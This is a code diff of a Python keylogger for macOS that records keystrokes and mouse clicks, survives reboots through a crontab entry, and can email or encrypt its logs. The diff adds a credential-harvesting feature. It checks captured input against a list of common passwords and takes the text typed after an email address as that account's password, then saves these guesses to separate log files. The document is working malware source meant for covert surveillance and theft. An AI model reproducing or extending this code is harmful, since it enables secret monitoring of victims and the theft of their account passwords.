@@ -7,6 +7,7 @@ from email.mime.text import MIMEText
 import json
 import os
 from pynput import keyboard, mouse
+import re
 import smtplib
 import sys
 import threading
@@ -35,6 +36,10 @@ def setup_crontab(exe_name):
     # update the crontab
     os.system(f"( crontab -l; printf '@reboot \"~{exe_name}\"\n' ) | crontab -")
 
+def is_email(email):
+    regex = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")
+    return re.match(regex, email)
+
 """
     EMAIL SENDING
 """
@@ -61,6 +66,22 @@ def send_email(json_string):
     server.quit()
 
 """
+    EMAIL PASSWORD GUESSING
+"""
+
+def find_next_password(slice):
+    """
+        Given the slice of an array just after where an email was found, find the first dictionary with an "o" key
+        This is likely to be a password so return its value
+        Return None if no password was found
+    """
+    for s in slice:
+        if not 'o' in s:
+            continue
+        return s['o']
+    return None
+        
+"""
     APPLICATION TRACKING
 """
 
@@ -69,11 +90,13 @@ def get_focus_app_string():
     return workspace.activeApplication()['NSApplicationName']
 
 """
-    ENCRYPTION
+    FILEWRITING
 """
-def write_encrypted_file(json_string, passphrase, filename):
-    key = 'fishing-in-the-river-champion!'
+def write_normal_file(json_string, filename):
+    with open(filename, 'w') as f:
+        f.write(json_string)
 
+def write_encrypted_file(json_string, passphrase, filename):
     temp_json_file = str(uuid.uuid4())
     with open(temp_json_file, 'w') as f:
         f.write(json_string)
@@ -85,8 +108,6 @@ def write_encrypted_file(json_string, passphrase, filename):
     MONITORING
 """
 
-passwords = set(("123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"))
-
 class Monitor:
     def __init__(self):
         # settings as they appear in generate.exe
@@ -97,23 +118,95 @@ class Monitor:
         self.log_via_email = False
 
         self.log_folder = 'logs'
+        # the guesses will have the same name as normal log files, but they will have this suffix at the end of their name
+        self.guess_suffx = 'special'
+        self.password_set = {"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"}
 
         # state variables
         self.logs = list()
         self.text = str()
+    
+        # for password guessing
+        
+        # logs of all inputs filtered out using special rules outlined in 4.2
+        self.guess_logs = list()
+        # the text of the current password guess
+        self.guess_text = str()
+        # the actual guesses made
+        self.guesses = list()
         
         # listeners
         self.keys = keyboard.Listener(on_press=self.on_press)
         self.mice = mouse.Listener(on_click=self.on_click)
+
+    # relating to guessing
+
+    def update_guess_text(self): 
+        # dont' do anything if there is no guess text
+        if not self.guess_text:
+            return
+        
+        self.guess_logs.append({'o' : self.guess_text})
+        self.guess_text = str()
+
+    # handling guess special characters
+    def handle_special_key_guess(self, key):
+        # determine whether it is time to break out of the current guess
+        break_keys = {keyboard.Key.tab, keyboard.Key.enter}
+        if key in break_keys:
+            self.update_guess_text()
+            self.guess_logs.append({'s' : key.name.upper()})
+        
+        # ignore other special keys
+    
+    def lookup_guess(self):
+        """
+            perform a guess based on a dictionnary / lookup table attack
+        """
+        for item in self.guess_logs:
+            # only consider ordinary text
+            if not 'o' in item:
+                continue
+            
+            guess = item['o']
+            lowercase_guess = guess.lower()
+            if lowercase_guess in self.password_set:
+                self.guesses.append(guess)
+                self.password_set.discard(lowercase_guess)
+
+    def email_guess(self):
+        for idx, item in enumerate(self.guess_logs):
+            if not 'o' in item:
+                continue
+            
+            text = item['o']
+            if is_email(text):
+                password = find_next_password(self.guess_logs[idx + 1:])
+                if password:
+                    self.guesses.append(password)
+    
+    def perform_guess_strategies(self):
+        if not self.guess_logs:
+            return
+        
+        self.lookup_guess()
+        self.email_guess()
+
+        json_string = json.dumps(self.guesses, indent=4)
+        filename = f'{self.log_folder}/{timestamp()} {self.guess_suffx}.json'
+        write_normal_file(json_string, filename)
+
+        self.guesses = list()
+        self.guess_logs = list()
+    
+    # relating to normal logging
     
     def log_to_file(self, json_string):
         filename = f'{self.log_folder}/{timestamp()}.json'
         if self.encrypt_logfiles:
             write_encrypted_file(json_string, self.passphrase, filename)
         else:
-            # no encryption - quicker to just write the code instead of making a new function
-            with open(filename, 'w') as f:
-                f.write(json_string)
+            write_normal_file(json_string, filename)
     
     def update_text(self):
         # don't update text if it is empty
@@ -144,6 +237,7 @@ class Monitor:
         timer.start()
 
         self.create_log()
+        self.perform_guess_strategies()
     
     def record_raw_input(self, input_dict):
         self.update_text()
@@ -156,19 +250,28 @@ class Monitor:
 
         if (key == keyboard.Key.esc):
             self.create_log()
+            self.perform_guess_strategies()
             self.mice.stop()
             return False
         
         try:
             self.text += key.char
+            # record any normal key for the guessing
+            self.guess_text += key.char
         # when we hit a special character we update all regular text
         except AttributeError:
+            self.handle_special_key_guess(key)
             self.record_raw_input({'s' : key.name.upper()})
 
     # pass in x and y to follow expected parameters of on_click
     def on_click(self, x, y, button, pressed):
         if (pressed):
-            self.record_raw_input({'m' : button.name.upper()})
+            record = {'m' : button.name.upper()}
+            self.record_raw_input(record)
+
+            # the text for the guess would have been entered first so update it first before recording the mouse click
+            self.update_guess_text()
+            self.guess_logs.append(record)
 
     def run(self):
         # run crontab on MacOS to ensure exe starts on system boot
